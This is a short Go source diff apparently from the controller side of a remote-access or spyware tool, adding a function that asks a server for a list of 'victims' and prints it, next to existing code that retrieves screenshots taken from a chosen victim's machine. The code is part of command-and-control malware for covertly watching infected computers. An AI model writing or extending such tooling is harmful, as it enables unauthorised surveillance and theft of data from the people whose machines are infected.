@@ -39,6 +39,20 @@ func ExecuteAliasCommand(command *models.Command, aliasRepo *repo.AliasRepo) err
 	return nil
 }
 
+func ExecuteGetVictims(command *models.Command, aliasRepo *repo.AliasRepo) error {
+	var res []string
+	resp, err := network.GetFromServer(&models.TextLog{Body: command.Command, Log: models.Log{Date: time.Now(), Victim: ""}})
+	if err != nil {
+		fmt.Println("Error reaching the server")
+		return err
+	}
+	json.NewDecoder(resp.Body).Decode(&res)
+	for _, file := range res {
+		fmt.Println(file)
+	}
+	return nil
+}
+
 func ExecuteScreenshotGet(body []string, aliasRepo *repo.AliasRepo) error {
 	var res []byte
 	resp, err := network.GetFromServer(&models.TextLog{Body: "screenshot", Log: models.Log{Date: time.Now(), Victim: aliasRepo.GetVictim(body[0])}})
